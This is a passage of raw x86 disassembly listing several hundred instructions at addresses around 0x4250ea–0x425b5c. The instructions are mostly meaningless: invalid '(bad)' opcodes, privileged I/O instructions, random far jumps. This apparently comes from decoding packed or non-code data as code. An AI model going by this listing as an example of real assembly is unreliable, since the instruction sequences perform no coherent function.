  4250ea:	inc    ecx
  4250eb:	mov    edx,0xc3f82103
  4250f0:	jns    0x4250eb
  4250f2:	or     ah,0x4
  4250f5:	ins    DWORD PTR es:[edi],dx
  4250f6:	dec    ebx
  4250f7:	cli    
  4250f8:	int3   
  4250f9:	add    esp,edx
  4250fb:	das    
  4250fc:	in     eax,0x22
  4250fe:	stos   BYTE PTR es:[edi],al
  4250ff:	cli    
  425100:	ficom  WORD PTR ds:[esi]
  425103:	inc    edi
  425104:	xor    al,0x4b
  425106:	cdq    
  425107:	adc    BYTE PTR [edx],ch
  425109:	aam    0x9a
  42510b:	je     0x4250d3
  42510d:	cmp    al,0xaf
  42510f:	mov    edx,DWORD PTR [esi+0x58]
  425112:	stc    
  425113:	adc    eax,0x313e26d3
  425118:	sub    al,0xf5
  42511a:	shl    BYTE PTR [esi],1
  42511c:	cmp    DWORD PTR [ecx+0x2de3fdc6],edi
  425122:	lea    edx,[eax+0x54]
  425125:	lods   al,BYTE PTR ds:[esi]
  425126:	imul   eax
  425128:	or     eax,0xb4c1be79
  42512d:	ftst   
  42512f:	inc    ebp
  425130:	push   0xffffff8c
  425132:	repnz adc eax,0x6a941c44
  425138:	push   eax
  425139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42513a:	mov    ecx,0xfa90691
  42513f:	cwde   
  425140:	imul   eax,DWORD PTR [eax],0x0
	...
  4251b2:	add    BYTE PTR [eax],al
  4251b4:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  4251bb:	call   DWORD PTR [esi+0x14]
  4251be:	and    esp,esi
  4251c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251c1:	js     0x425158
  4251c3:	pop    ds
  4251c4:	sbb    eax,0xf500018b
  4251c9:	add    BYTE PTR [eax],al
  4251cb:	add    BYTE PTR [edx-0x67f0ccd5],ah
  4251d1:	mov    esp,0xe202fca0
  4251d6:	fistp  QWORD PTR [edi]
  4251d8:	hlt    
  4251d9:	jb     0x42524e
  4251db:	repnz push esi
  4251dd:	js     0x425162
  4251df:	and    al,0x56
  4251e1:	xchg   esp,eax
  4251e2:	fcos   
  4251e4:	iret   
  4251e5:	stos   DWORD PTR es:[edi],eax
  4251e6:	std    
  4251e7:	imul   ecx,DWORD PTR [edx+0x79b6003e],0xffffffc3
  4251ee:	loopne 0x425231
  4251f0:	adc    DWORD PTR [ecx],0x75
  4251f3:	jecxz  0x425251
  4251f5:	mov    gs,WORD PTR [ebx]
  4251f7:	arpl   WORD PTR [edi-0x657c5c0],si
  4251fd:	(bad)  
  4251fe:	repz shl DWORD PTR [edi],1
  425201:	push   es
  425202:	jg     0x4251b0
  425204:	out    0x31,eax
  425206:	call   0xb445:0xd0b478ee
  42520d:	idiv   edi
  42520f:	sbb    al,0xf0
  425211:	lea    eax,[ecx+edx*1-0xba29670]
  425218:	pop    DWORD PTR [edi+0x77e1b3f7]
  42521e:	lea    ebp,[ebx]
  425220:	ret    0x380d
  425223:	cmp    eax,eax
  425225:	pushf  
  425226:	pop    esi
  425227:	dec    edx
  425228:	cmp    cl,BYTE PTR [esi-0x60]
  42522b:	bound  edx,QWORD PTR [edi+0x4f]
  42522e:	rol    edx,0x49
  425231:	lods   al,BYTE PTR ds:[esi]
  425232:	call   0xa29a:0xb5c43d32
  425239:	pop    edi
  42523a:	(bad)  
  42523b:	jmp    0xab5ea19
  425240:	int3   
  425241:	or     DWORD PTR [esi-0x45],ebp
  425244:	push   ebp
  425245:	jb     0x4251d5
  425247:	xchg   esp,eax
  425248:	mov    eax,DWORD PTR [ecx+0x36]
  42524b:	lods   eax,DWORD PTR ds:[esi]
  42524c:	cs sti 
  42524e:	sti    
  42524f:	and    ecx,DWORD PTR [ebx]
  425251:	sub    eax,0x3d8f96da
  425256:	pop    ds
  425257:	xor    eax,0xbec7c0ed
  42525c:	xchg   BYTE PTR [ecx-0x7e],ch
  42525f:	test   BYTE PTR [ecx],0x7c
  425262:	dec    esp
  425263:	pop    ds
  425264:	std    
  425265:	mov    esp,0x2c098045
  42526a:	jge    0x4246cfa0
  425270:	icebp  
  425271:	mov    ebp,0x7a3c1327
  425276:	pushf  
  425277:	shl    al,cl
  425279:	mov    dl,0x91
  42527b:	lods   al,BYTE PTR ds:[esi]
  42527c:	mov    al,0xce
  42527e:	ret    
  42527f:	shl    DWORD PTR [esi+0x1fa95085],0xa6
  425286:	mov    ds:0x2a9aa461,eax
  42528b:	sbb    DWORD PTR [ebx+0x32ec2f7b],edi
  425291:	out    dx,al
  425292:	(bad)
  425296:	add    DWORD PTR es:[edx-0x3c],esi
  42529a:	jmp    0x4252b9
  42529c:	mov    ?,WORD PTR [ebx+0x4181fccd]
  4252a2:	icebp  
  4252a3:	and    ebp,DWORD PTR ds:[edi+0x7c]
  4252a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4252a8:	add    bh,ch
  4252aa:	cmc    
  4252ab:	pop    edx
  4252ac:	jg     0x425240
  4252ae:	repz pop es
  4252b0:	push   edx
  4252b1:	xchg   ecx,eax
  4252b2:	frstor [ebx+ebp*4]
  4252b5:	into   
  4252b6:	adc    eax,0xd64bc6ea
  4252bb:	jp     0x42528c
  4252bd:	xchg   esp,eax
  4252be:	rol    BYTE PTR [esi],1
  4252c0:	mov    al,0x0
	...
  425332:	add    BYTE PTR [eax],al
  425334:	mov    ah,BYTE PTR [esi]
  425336:	jge    0x4252f2
  425338:	std    
  425339:	sti    
  42533a:	iret   
  42533b:	and    DWORD PTR ss:[ebx+0x1a],ebx
  42533f:	repnz xor BYTE PTR [edi-0x73ed175d],ah
  425346:	add    DWORD PTR [eax],eax
  425348:	cmc    
  425349:	add    BYTE PTR [eax],al
  42534b:	add    BYTE PTR [ebp-0x7492d994],ah
  425351:	xchg   al,dh
  425353:	cli    
  425354:	scas   al,BYTE PTR es:[edi]
  425355:	jmp    ebp
  425357:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425358:	pop    ecx
  425359:	arpl   bx,dx
  42535b:	ins    BYTE PTR es:[edi],dx
  42535c:	mov    bh,0x61
  42535e:	(bad)
  425362:	adc    cl,0x3
  425365:	cmp    BYTE PTR [ebp-0x42],0x22
  425369:	das    
  42536a:	sub    al,0x59
  42536c:	adc    BYTE PTR [edx],cl
  42536e:	in     eax,0x54
  425370:	push   0xc95c9a29
  425375:	add    esp,DWORD PTR [ecx+0x5e]
  425378:	dec    DWORD PTR [edi]
  42537a:	(bad)  
  42537b:	xchg   esi,eax
  42537c:	xor    ch,cl
  42537e:	adc    al,0x1e
  425380:	out    0xa4,eax
  425382:	sub    bh,ch
  425384:	fnclex 
  425386:	pusha  
  425387:	push   ebp
  425388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425389:	in     eax,dx
  42538a:	push   esp
  42538b:	dec    edi
  42538c:	out    dx,eax
  42538d:	test   esp,eax
  42538f:	out    0x5c,al
  425391:	daa    
  425392:	pop    esp
  425393:	cmp    DWORD PTR [ecx+0x72a52539],0xffffffa3
  42539a:	test   DWORD PTR [ecx-0x32fe4ed8],edx
  4253a0:	sub    DWORD PTR [ecx-0x7fa97f8e],eax
  4253a6:	ins    DWORD PTR es:[edi],dx
  4253a7:	adc    BYTE PTR [ebx],bh
  4253a9:	test   BYTE PTR [eax+0x1c],dh
  4253ac:	in     al,0xd0
  4253ae:	in     al,0x72
  4253b0:	jp     0x425333
  4253b2:	loopne 0x42534b
  4253b4:	push   ebx
  4253b5:	dec    edi
  4253b6:	outs   dx,DWORD PTR ds:[esi]
  4253b7:	push   esi
  4253b8:	mov    ds:0xfd960770,eax
  4253bd:	mov    DWORD PTR [ecx],esp
  4253bf:	jg     0x425406
  4253c1:	arpl   WORD PTR [ebp+0x4f],dx
  4253c4:	arpl   WORD PTR [edx-0x377880f8],si
  4253ca:	std    
  4253cb:	test   ebx,esi
  4253cd:	and    BYTE PTR [ebx+ebp*8],ah
  4253d0:	ins    DWORD PTR es:[edi],dx
  4253d1:	retf   0xa2a6
  4253d4:	call   0xbf7c:0x99515371
  4253db:	test   al,0xbc
  4253dd:	(bad)  
  4253de:	lea    esi,[esi+0x61]
  4253e1:	scas   eax,DWORD PTR es:[edi]
  4253e2:	aas    
  4253e3:	call   0x54a2:0x6a7d2614
  4253ea:	push   edx
  4253eb:	cmp    eax,0x98addf5f
  4253f0:	push   cs
  4253f1:	adc    ebp,ebx
  4253f3:	test   BYTE PTR [eax-0x44],bl
  4253f6:	aad    0x63
  4253f8:	sub    al,BYTE PTR [edx+0x7a]
  4253fb:	pop    esp
  4253fc:	cmp    DWORD PTR [esp+ebp*8-0x191b7185],eax
  425403:	sub    BYTE PTR [ecx-0x53],bh
  425406:	add    eax,DWORD PTR [edx+0x523cdec4]
  42540c:	cli    
  42540d:	sahf   
  42540e:	sbb    bl,BYTE PTR [edx+ebp*8+0x3b]
  425412:	pop    eax
  425413:	retf   0x81eb
  425416:	mov    ebx,DWORD PTR [ebp-0x23890355]
  42541c:	pushf  
  42541d:	jbe    0x425407
  42541f:	fcomi  st,st(7)
  425421:	jb     0x4253df
  425423:	add    eax,ebx
  425425:	arpl   WORD PTR [ebx],sp
  425427:	test   al,0xd3
  425429:	sub    bl,bh
  42542b:	sbb    al,bh
  42542d:	mov    DWORD PTR [ebp+0x14],ebp
  425430:	add    bl,BYTE PTR [edx+0x10267705]
  425436:	outs   dx,BYTE PTR ds:[esi]
  425437:	dec    esi
  425438:	push   esi
  425439:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42543b:	ror    BYTE PTR [ebx-0x48274aeb],cl
	...
  4254b1:	add    BYTE PTR [eax],al
  4254b3:	add    al,ah
  4254b5:	outs   dx,DWORD PTR ds:[esi]
  4254b6:	xchg   esi,eax
  4254b7:	inc    edx
  4254b8:	lahf   
  4254b9:	sti    
  4254ba:	hlt    
  4254bb:	out    dx,eax
  4254bc:	cmp    dh,BYTE PTR [ebx]
  4254be:	loop   0x42544b
  4254c0:	push   cs
  4254c1:	outs   dx,BYTE PTR ds:[esi]
  4254c2:	cwde   
  4254c3:	pop    esp
  4254c4:	pop    es
  4254c5:	lea    eax,[ecx]
  4254c7:	add    ch,dh
  4254c9:	add    BYTE PTR [eax],al
  4254cb:	add    BYTE PTR [edx+0x35],ch
  4254ce:	push   es
  4254cf:	dec    DWORD PTR [ebp+0x59c78a38]
  4254d5:	mov    ds:0x89716ce0,eax
  4254da:	pop    ebx
  4254db:	scas   eax,DWORD PTR es:[edi]
  4254dc:	ja     0x42549b
  4254de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254df:	fisubr DWORD PTR [bp+si]
  4254e2:	add    WORD PTR [ebx],0xf9d4
  4254e7:	pop    edi
  4254e8:	mov    ebx,0x21caac85
  4254ed:	mov    edi,0x57d12eb5
  4254f2:	pop    ecx
  4254f3:	mov    al,ds:0xde35c20d
  4254f8:	mov    ds:0x26c0a970,al
  4254fd:	aam    0x7f
  4254ff:	dec    esi
  425500:	and    al,BYTE PTR [edx]
  425502:	test   eax,0xdb95e25c
  425507:	jge    0x42549a
  425509:	outs   dx,DWORD PTR ds:[esi]
  42550a:	fcom   DWORD PTR [esi]
  42550c:	xchg   ebp,eax
  42550d:	xchg   ebp,eax
  42550e:	xchg   esp,eax
  42550f:	out    0xaa,eax
  425511:	jno    0x4254b1
  425513:	mov    ah,0xe0
  425515:	lods   eax,DWORD PTR ds:[esi]
  425516:	test   eax,0xf92c01d6
  42551b:	mov    dh,0x82
  42551d:	dec    eax
  42551e:	dec    esi
  42551f:	cdq    
  425520:	cli    
  425521:	lea    esi,[edi]
  425523:	jae    0x425575
  425525:	sbb    BYTE PTR [eax-0x1f],dh
  425528:	popf   
  425529:	in     eax,dx
  42552a:	mov    gs,WORD PTR [ebx+0x63]
  42552d:	dec    ecx
  42552e:	pop    eax
  42552f:	fdivr  st,st(1)
  425531:	test   BYTE PTR [ecx-0x59a067b3],bh
  425537:	jmp    0x425520
  425539:	and    BYTE PTR [eax+eax*2],bl
  42553c:	es sub al,dl
  42553f:	call   0xeb8d:0x156b93f0
  425546:	pop    edi
  425547:	and    eax,ebx
  425549:	xchg   ebx,eax
  42554a:	xchg   edi,eax
  42554b:	pop    ebx
  42554c:	js     0x425508
  42554e:	popf   
  42554f:	mov    ch,0x7f
  425551:	(bad)  
  425552:	pop    esi
  425553:	xor    edx,ebp
  425555:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425556:	mov    DWORD PTR [ecx-0x1d176473],ebp
  42555c:	lods   eax,DWORD PTR ds:[esi]
  42555d:	add    edx,ebx
  42555f:	mov    ch,0x44
  425561:	rcr    BYTE PTR [esi+0xdc5082e],0xdf
  425568:	(bad)  
  425569:	les    edi,FWORD PTR [esi+eax*4+0x40]
  42556d:	loop   0x4254f5
  42556f:	pop    es
  425570:	jae    0x425503
  425572:	sub    ch,dh
  425574:	cs loop 0x4255ae
  425577:	cmc    
  425578:	fist   DWORD PTR [edi]
  42557a:	xor    ah,BYTE PTR ds:0xc1f2d08a
  425580:	rcl    DWORD PTR [edi+0x22444794],cl
  425586:	or     al,0xfb
  425588:	adc    cl,cl
  42558a:	rcl    dh,0x6f
  42558d:	add    esi,DWORD PTR [edx+ebx*2+0x2e1f4601]
  425594:	push   es
  425595:	inc    ebx
  425596:	idiv   ch
  425598:	mov    edi,0xf2d04b7f
  42559d:	or     DWORD PTR [edi-0xa7a7dcd],0x1d
  4255a4:	shl    BYTE PTR [ebp+0x72474276],cl
  4255aa:	inc    esp
  4255ab:	aas    
  4255ac:	add    BYTE PTR [edi-0x5c],dh
  4255af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4255b0:	pusha  
  4255b1:	dec    eax
  4255b2:	fnstenv [ebp-0xe]
  4255b5:	add    al,0x40
  4255b7:	test   al,0x9c
  4255b9:	pop    ecx
  4255ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255bb:	or     edi,ebx
  4255bd:	push   ds
  4255be:	popf   
  4255bf:	js     0x4255c4
	...
  425631:	add    BYTE PTR [eax],al
  425633:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42563a:	mov    edi,0x14500ad3
  42563f:	into   
  425640:	cs cdq 
  425642:	mov    eax,ds:0x18dfc65
  425647:	add    ch,dh
  425649:	add    BYTE PTR [eax],al
  42564b:	add    dh,bl
  42564d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42564e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42564f:	jnp    0x42564e
  425651:	mov    DWORD PTR [esp-0x582c55d7],eax
  425658:	fstp   DWORD PTR [edx]
  42565a:	pop    es
  42565b:	xchg   DWORD PTR [eax-0x6479c12f],ecx
  425661:	test   DWORD PTR [ecx+esi*2+0x2f12ca1],ebx
  425668:	sub    eax,DWORD PTR [ecx-0x1c]
  42566b:	lock ja 0x4256e1
  42566e:	xchg   edi,eax
  42566f:	mov    ebp,0x60b75e6c
  425674:	dec    ebx
  425675:	xchg   esi,eax
  425676:	shl    DWORD PTR [ebp+0x1e],0xe0
  42567a:	adc    al,0x58
  42567c:	mov    ebp,cs
  42567e:	mov    bh,0xc1
  425680:	pop    ebp
  425681:	cmp    cl,BYTE PTR [eax+0x15]
  425684:	sbb    eax,0xf03cf59a
  425689:	and    bh,BYTE PTR [eax]
  42568b:	bnd jle 0x4256a2
  42568e:	lds    eax,FWORD PTR [edx-0x583824f]
  425694:	add    DWORD PTR [edx],edi
  425696:	scas   al,BYTE PTR es:[edi]
  425697:	xor    BYTE PTR [ebx-0x24],ch
  42569a:	dec    edi
  42569b:	adc    al,0x4e
  42569d:	push   ds
  42569e:	mov    esi,0xc85f8e0
  4256a3:	xchg   ebp,eax
  4256a4:	mov    al,0x2a
  4256a6:	cwde   
  4256a7:	hlt    
  4256a8:	jge    0x425682
  4256aa:	mov    ah,0x31
  4256ac:	mov    cl,0x2a
  4256ae:	jge    0x425691
  4256b0:	push   cs
  4256b1:	arpl   WORD PTR [edi+0x6318b344],di
  4256b7:	inc    eax
  4256b8:	imul   ebp,edx,0xce380d15
  4256be:	or     al,0x2f
  4256c0:	cmc    
  4256c1:	inc    ebp
  4256c2:	dec    ebx
  4256c3:	xchg   ebx,eax
  4256c4:	jle    0x4256bc
  4256c6:	jge    0x4256a9
  4256c8:	(bad)  
  4256c9:	stos   DWORD PTR es:[edi],eax
  4256ca:	xor    al,0x25
  4256cc:	mov    eax,ds:0xdb89e973
  4256d1:	dec    esi
  4256d2:	push   0xfffffff7
  4256d4:	or     esp,edx
  4256d6:	or     DWORD PTR [ebx-0x73],eax
  4256d9:	ja     0x42575a
  4256db:	sub    BYTE PTR ds:0xc25a5a27,bl
  4256e1:	mov    ds:0x23d09582,al
  4256e6:	xchg   edi,eax
  4256e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4256e8:	or     eax,0xf4126000
  4256ed:	jg     0x4256af
  4256ef:	enter  0x8ee0,0x3b
  4256f3:	jns    0x425685
  4256f5:	inc    edi
  4256f6:	imul   ebp,DWORD PTR [edi],0x763ad032
  4256fc:	push   eax
  4256fd:	hlt    
  4256fe:	or     al,bh
  425700:	adc    eax,0xdaee246a
  425705:	fld    DWORD PTR [edx+ecx*1]
  425708:	mov    edi,0x103ea5a4
  42570d:	rcl    DWORD PTR [edx+ecx*1+0x5],cl
  425711:	lahf   
  425712:	push   ebp
  425713:	pop    ds
  425714:	ss sti 
  425716:	dec    edi
  425717:	psrld  mm7,QWORD PTR ds:0x39542ef4
  42571e:	sub    al,BYTE PTR [esi+0x6d]
  425721:	xor    ebx,DWORD PTR [esi+0x15380c0b]
  425727:	jp     0x425762
  425729:	xchg   DWORD PTR [ecx-0x1dfe4bb5],esi
  42572f:	cmc    
  425730:	cmp    al,bh
  425732:	(bad)  
  425733:	push   ebx
  425734:	jo     0x425770
  425736:	mov    bh,0x80
  425738:	addr16 dec esi
  42573a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42573b:	fcom   st(1)
  42573d:	sub    al,0x23
  42573f:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  4257b1:	add    BYTE PTR [eax],al
  4257b3:	add    BYTE PTR [edx],ah
  4257b5:	pop    eax
  4257b6:	test   bh,ch
  4257b8:	(bad)  
  4257b9:	jmp    FWORD PTR [ebx-0x23]
  4257bc:	jp     0x425751
  4257be:	cmp    edx,esp
  4257c0:	pop    esp
  4257c1:	sbb    eax,0x8ef183e5
  4257c6:	add    DWORD PTR [eax],eax
  4257c8:	cmc    
  4257c9:	add    BYTE PTR [eax],al
  4257cb:	add    BYTE PTR [ecx-0x6c],al
  4257ce:	jp     0x425793
  4257d0:	in     al,dx
  4257d1:	mov    bl,0x79
  4257d3:	std    
  4257d4:	fwait
  4257d5:	mov    esp,0x4f947f50
  4257da:	outs   dx,DWORD PTR ds:[esi]
  4257db:	cmp    bh,cl
  4257dd:	imul   ecx,DWORD PTR [esi],0x5f
  4257e0:	lods   al,BYTE PTR ds:[esi]
  4257e1:	add    eax,0xaa39f28f
  4257e6:	or     bl,ah
  4257e8:	out    dx,al
  4257e9:	mov    ch,0xee
  4257eb:	leave  
  4257ec:	push   cs
  4257ed:	cli    
  4257ee:	mov    edi,0x9037b6c1
  4257f3:	xchg   edx,eax
  4257f4:	and    DWORD PTR [esi-0x12],edi
  4257f7:	mov    ?,WORD PTR [esi+0x1a]
  4257fa:	cmp    al,0x6f
  4257fc:	push   ebp
  4257fd:	cwde   
  4257fe:	imul   ecx,DWORD PTR [edx+0x3afe3fc6],0x24c0fe42
  425808:	mov    BYTE PTR [ecx+0x3],bh
  42580b:	xor    DWORD PTR [edi+0x21],ecx
  42580e:	test   eax,0xf962345b
  425813:	aaa    
  425814:	sub    edx,DWORD PTR [esi+ebp*4-0x9]
  425818:	fisttp DWORD PTR [ecx+0x70e17fd2]
  42581e:	adc    edi,esp
  425820:	shr    BYTE PTR [ecx-0x7d],0x77
  425824:	xlat   BYTE PTR ds:[ebx]
  425825:	xchg   esp,eax
  425826:	lds    ebp,FWORD PTR [edi-0x515f8928]
  42582c:	(bad)  [ecx+eax*2-0x11]
  425830:	out    0xf7,al
  425832:	lds    esi,FWORD PTR [edx+esi*1]
  425835:	mov    bh,BYTE PTR [esi+esi*4]
  425838:	or     eax,0x79d310e
  42583d:	iret   
  42583e:	ds dec ebx
  425840:	pop    edx
  425841:	sbb    al,0x1a
  425843:	pop    ebx
  425844:	hlt    
  425845:	lahf   
  425846:	enter  0x9ca8,0x26
  42584a:	(bad)  
  42584b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42584c:	mov    edi,0xa7f11a1d
  425851:	bound  edx,QWORD PTR [eax]
  425853:	jmp    0x201:0xaac9ef73
  42585a:	push   ecx
  42585b:	(bad)  
  42585c:	jbe    0x4258c6
  42585e:	and    eax,0xfadade91
  425863:	stos   DWORD PTR es:[edi],eax
  425864:	mov    ebx,esi
  425866:	adc    ebx,DWORD PTR [ebx]
  425868:	mov    bl,ah
  42586a:	test   eax,0x642fecb5
  42586f:	jbe    0x4258d4
  425871:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425872:	pop    ebx
  425873:	fstp   QWORD PTR [ebp-0x52]
  425876:	out    0xf5,al
  425878:	or     DWORD PTR [edx],ebp
  42587a:	jmp    0x4258a3
  42587c:	(bad)  
  42587d:	pop    ds
  42587e:	adc    DWORD PTR [edi+0x5340c612],edx
  425884:	arpl   WORD PTR [esi-0x1a6ffca6],si
  42588a:	cwde   
  42588b:	mul    BYTE PTR [ecx-0x2d]
  42588e:	xchg   BYTE PTR [eax+eax*8],bh
  425891:	mov    esi,0xad95b9f6
  425896:	daa    
  425897:	jb     0x425879
  425899:	xchg   edi,eax
  42589a:	xchg   ebx,ebp
  42589c:	jp     0x42589b
  42589e:	adc    ch,BYTE PTR [eax+0x6e]
  4258a1:	js     0x425922
  4258a3:	pop    ss
  4258a4:	sbb    ebp,edi
  4258a6:	xor    DWORD PTR [esp+ebx*8-0x1de375a9],eax
  4258ad:	cmp    al,0xaf
  4258af:	mov    WORD PTR [ebp-0x18],ds
  4258b2:	fsub   st,st(3)
  4258b4:	xchg   ecx,eax
  4258b5:	stos   BYTE PTR es:[edi],al
  4258b6:	cld    
  4258b7:	jl     0x425938
  4258b9:	int3   
  4258ba:	stos   DWORD PTR es:[edi],eax
  4258bb:	lods   eax,DWORD PTR ds:[esi]
  4258bc:	adc    eax,0x6f898eb9
	...
  425931:	add    BYTE PTR [eax],al
  425933:	add    BYTE PTR [ebx+0x18],ch
  425936:	arpl   WORD PTR [edx+0x73],bp
  425939:	jnp    0x4259a6
  42593b:	sbb    esp,esp
  42593d:	xchg   edi,eax
  42593e:	sub    DWORD PTR [ecx],edi
  425940:	call   0xe6cdabf3
  425945:	pop    DWORD PTR [ecx]
  425947:	add    ch,dh
  425949:	add    BYTE PTR [eax],al
  42594b:	add    BYTE PTR [ebp+0x478d4f51],dh
  425951:	dec    edi
  425952:	sub    al,0x20
  425954:	cmp    dl,BYTE PTR [eax+0xc7f88c2]
  42595a:	and    ch,ah
  42595c:	fwait
  42595d:	xor    ebp,0x74711e06
  425963:	ss jmp 0x65f627dc
  425969:	popf   
  42596a:	xor    edi,esp
  42596c:	lods   al,BYTE PTR ds:[esi]
  42596d:	mov    edx,0x8afc0ef3
  425972:	pop    ds
  425973:	out    0x14,al
  425975:	clc    
  425976:	adc    al,0x6b
  425978:	mov    ch,0x32
  42597a:	(bad)  
  42597b:	hlt    
  42597c:	(bad)  
  42597d:	scas   eax,DWORD PTR es:[edi]
  42597e:	xlat   BYTE PTR ds:[ebx]
  42597f:	sub    esi,DWORD PTR ds:0x5d6a9d1b
  425985:	jp     0x4259b6
  425987:	adc    BYTE PTR [esi],dl
  425989:	ja     0x425929
  42598b:	mov    ah,0x80
  42598d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42598e:	out    dx,al
  42598f:	out    0x10,eax
  425991:	add    DWORD PTR [esp+ebx*1+0x1f],ecx
  425995:	out    dx,eax
  425996:	pop    ss
  425997:	repz pop eax
  425999:	int    0x1b
  42599b:	test   DWORD PTR [ecx+esi*2-0x66416922],eax
  4259a2:	jmp    0x425984
  4259a4:	ins    BYTE PTR es:[edi],dx
  4259a5:	jns    0x42592f
  4259a7:	pop    ebp
  4259a8:	adc    ecx,DWORD PTR [esi]
  4259aa:	ror    DWORD PTR [edi+eiz*8],0x1a
  4259ae:	mov    dl,0x71
  4259b0:	xchg   DWORD PTR [ebx],ecx
  4259b2:	pop    esp
  4259b3:	jl     0x425a1b
  4259b5:	ja     0x425973
  4259b7:	inc    edi
  4259b8:	jnp    0x425957
  4259ba:	fpatan 
  4259bc:	adc    DWORD PTR [ecx-0x5adac0f2],ebp
  4259c2:	mov    al,ds:0xd0bda82b
  4259c7:	and    DWORD PTR ds:0x285b8598,edx
  4259cd:	inc    ebp
  4259ce:	out    dx,al
  4259cf:	push   ebx
  4259d0:	or     al,0xde
  4259d2:	lea    ebx,[edx]
  4259d4:	mov    edx,0x83bb0208
  4259d9:	sti    
  4259da:	pop    es
  4259db:	adc    al,BYTE PTR [ecx+ecx*4]
  4259de:	add    al,0xe1
  4259e0:	pop    edi
  4259e1:	add    BYTE PTR [esi],ch
  4259e3:	mov    dl,0x8f
  4259e5:	pop    esp
  4259e6:	sar    DWORD PTR [ecx],1
  4259e8:	(bad)  
  4259ea:	mov    dl,0x39
  4259ec:	aam    0xfb
  4259ee:	push   ebx
  4259ef:	push   eax
  4259f0:	sub    DWORD PTR [ecx+ebx*4],esp
  4259f3:	push   eax
  4259f4:	push   edi
  4259f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259f6:	jb     0x4259f5
  4259f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4259f9:	pop    es
  4259fa:	sub    BYTE PTR [eax+0x35],bh
  4259fd:	ficom  WORD PTR [ecx-0x1b]
  425a00:	jbe    0x4259c1
  425a02:	dec    edi
  425a03:	sti    
  425a04:	xchg   ecx,eax
  425a05:	cli    
  425a06:	sub    eax,0xaabd66b4
  425a0b:	into   
  425a0c:	mov    ebx,0x93a521b9
  425a11:	sbb    eax,0x376d3c80
  425a16:	ret    0x3d38
  425a19:	into   
  425a1a:	mov    DWORD PTR [eax-0x70583f50],edx
  425a20:	jbe    0x4259cd
  425a22:	pusha  
  425a23:	loop   0x425a2b
  425a25:	clc    
  425a26:	sub    DWORD PTR ds:0x2c412449,eax
  425a2c:	jp     0x425a8d
  425a2e:	push   esi
  425a2f:	sub    DWORD PTR [eax+0x4d1b243c],ecx
  425a35:	out    0x5d,eax
  425a37:	cli    
  425a38:	mov    eax,ds:0xcf6e4705
  425a3d:	cmp    cl,BYTE PTR [edi+0x92d5]
	...
  425ab3:	add    BYTE PTR [esi],al
  425ab5:	aas    
  425ab6:	or     eax,0xb6bb3db9
  425abb:	mov    edi,0xa9fcb6ec
  425ac0:	add    al,0x73
  425ac2:	add    edx,esp
  425ac4:	fist   DWORD PTR [eax+0xf50001]
  425aca:	add    BYTE PTR [eax],al
  425acc:	sahf   
  425acd:	pop    ebp
  425ace:	jmp    0xeae3:0xce1a6c69
  425ad5:	js     0x425b43
  425ad7:	pop    ss
  425ad8:	xchg   esi,eax
  425ad9:	in     al,dx
  425ada:	mov    eax,ds:0x7f6448a0
  425adf:	sbb    BYTE PTR [ecx],dh
  425ae1:	retf   
  425ae2:	sbb    dh,BYTE PTR [esi]
  425ae4:	jg     0x425a83
  425ae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ae7:	and    edi,DWORD PTR [ecx+0x37]
  425aea:	xchg   ebx,eax
  425aeb:	les    edx,FWORD PTR [ebx-0x67]
  425aee:	xchg   edi,eax
  425aef:	imul   eax,DWORD PTR [ebx],0xb0b5fac6
  425af5:	scas   eax,DWORD PTR es:[edi]
  425af6:	loopne 0x425aec
  425af8:	jge    0x425a96
  425afa:	cld    
  425afb:	(bad)  
  425afc:	in     eax,dx
  425afd:	cli    
  425afe:	test   eax,0x73b129f
  425b03:	ss stos DWORD PTR es:[edi],eax
  425b05:	cmp    DWORD PTR [esi],edx
  425b07:	mov    edi,0xa15d55f7
  425b0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b0d:	cmp    DWORD PTR [eax-0x6f5ca68c],ebx
  425b13:	mov    al,ds:0xba906e9c
  425b19:	mov    ebx,0xa8df9d7
  425b1e:	test   BYTE PTR [edx],cl
  425b20:	lds    esi,FWORD PTR [esi-0x52]
  425b23:	pop    ecx
  425b24:	stos   BYTE PTR es:[edi],al
  425b25:	pop    esp
  425b26:	cmp    eax,0x5dec191b
  425b2b:	out    0x36,al
  425b2d:	and    cl,BYTE PTR [ebx+ebx*1-0x53]
  425b31:	sub    bl,al
  425b33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b34:	mov    al,0x63
  425b36:	aad    0x3
  425b38:	imul   edx,DWORD PTR ds:0x2f1e09fe,0xffffffb2
  425b3f:	pop    edi
  425b40:	aas    
  425b41:	inc    eax
  425b42:	jecxz  0x425acf
  425b44:	dec    eax
  425b45:	sub    esp,ecx
  425b47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b48:	mov    ah,0x74
  425b4a:	cwde   
  425b4b:	pusha  
  425b4c:	cmp    al,0x26
  425b4e:	cs ds out dx,al
  425b51:	je     0x425b99
  425b53:	pushf  
  425b54:	clc    
  425b55:	sbb    BYTE PTR [ecx+0x210b0b81],cl
  425b5b:	push   ss
  425b5c:	fcmovbe st,st(3)
